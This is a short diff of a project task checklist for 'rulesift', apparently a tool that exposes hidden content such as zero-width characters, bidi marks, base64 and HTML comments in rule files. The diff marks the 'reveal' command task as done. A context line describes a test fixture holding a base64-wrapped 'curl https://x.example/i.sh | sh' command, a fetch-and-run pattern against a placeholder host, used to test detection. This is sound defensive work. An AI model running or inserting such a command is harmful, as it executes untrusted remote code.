@@ -119,7 +119,7 @@ Legend: **Files** = files/modules touched. **Done when** = acceptance criteria. 
   - Done when: base64-wrapped harmless `curl https://x.example/i.sh | sh` fixture yields a `decoded` segment with the right line; depth limit tested.
   - Dep: W2-T7
 
-- [ ] **W3-T2 `rulesift reveal`**
+- [x] **W3-T2 `rulesift reveal`**
   - Description: CLI command per §6.2 including `--strip` (stdout only, never in place).
   - Files: `cli/reveal.rs`, `cli/main.rs`
   - Done when: `assert_cmd` snapshot of output for a fixture with tags, bidi, zero-width, base64, and an HTML comment; `--strip` output contains none of them.
